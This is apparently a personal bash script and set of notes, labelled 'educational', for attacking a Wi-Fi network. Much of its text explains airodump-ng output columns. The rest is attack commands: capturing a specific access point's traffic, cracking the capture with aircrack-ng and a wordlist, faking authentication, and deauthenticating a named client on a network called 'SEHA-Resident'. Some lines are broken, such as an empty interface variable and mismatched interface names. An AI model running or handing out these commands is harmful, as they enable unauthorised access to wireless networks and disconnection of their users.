#!/bin/bash

#Educational Purposes only:
#

interface=${}

ip link set ${interface} down
iwconfig ${interface} mode monitor
ip link set ${interface} up




sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

airodump-ng wlan1

#Channels 1 to 14 are used for 802.11b and g (in US, they only are allowed to use 1 to 11; 1 to 13 in Europe with some special cases; 1-14 in Japan)
#The upper data block shows the access points found:
#BSSID 	The MAC address of the AP
#RXQ 	Quality of the signal, when locked on a channel
#PWR 	Signal strength. Some drivers don't report it
#Beacons 	Number of beacon frames received. If you don't have a signal strength you can estimate it by the number of beacons: the more beacons, the better the signal quality
#Data 	Number of data frames received
#CH 	Channel the AP is operating on
#MB 	Speed or AP Mode. 11 is pure 802.11b, 54 pure 802.11g. Values between are a mixture
#ENC 	Encryption: OPN: no encryption, WEP: WEP encryption, WPA: WPA or WPA2 encryption, WEP?: WEP or WPA (don't know yet)
#ESSID 	The network name. Sometimes hidden

#The lower data block shows the clients found:
#BSSID 	The MAC of the AP this client is associated to
#STATION 	The MAC of the client itself
#PWR 	Signal strength. Some drivers don't report it
#Packets 	Number of data frames received
#Probes 	Network names (ESSIDs) this client has probed 

airodump-ng -c 6 --bssid 46:5F:0A:64:5A:26 -w dump wlan0mon


this device popped in, lost packets and made me lose packets?
see if bettercap shows anything?
```
8E:F7:EE:11:98:AB
```

no EAPOL data (connection based)?
aircrack-ng -b 78:45:58:2D:4A:D0 replay_arp-0924-202135.cap -w psk.txt

arp - mac filtering?
sudo aireplay-ng --fakeauth 6000 -o 70 -q 10 -e "SEHA-Resident" -a 78:45:58:2D:4A:D0 wlan1 --ignore-negative-one

Deauth - dropping of packets probably. 
sudo aireplay-ng --deauth 50 -a 78:45:58:2D:4A:D0 -c 2E:31:56:35:F6:52 wlan1 --ignore-negative-one
